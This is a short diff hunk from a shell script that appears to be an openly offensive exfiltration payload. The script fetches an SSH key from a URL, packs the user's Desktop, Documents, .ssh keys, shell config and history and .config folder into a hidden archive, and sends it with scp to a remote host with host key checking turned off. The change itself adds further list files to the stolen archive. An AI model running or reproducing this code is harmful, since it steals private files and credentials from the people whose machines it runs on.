@@ -29,7 +29,7 @@ curl -s $SSH_KEY_URL -o $LOCAL_LOOT_PATH/.s
 chmod 600 $LOCAL_LOOT_PATH/.s
 
 cd $LOCAL_LOOT_PATH
-tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh*
+tar cfz .loot.tgz $HOME/Desktop $HOME/Documents $HOME/.ssh $HOME/.bash* $HOME/.config $HOME/.zsh* $LOCAL_LOOT_PATH/*_list
 
 scp -o StrictHostKeyChecking=no -i $LOCAL_LOOT_PATH/.s $LOCAL_LOOT_PATH/.loot.tgz ${SSH_USER}@${SSH_HOST}:$REMOTE_LOOT_PATH
 
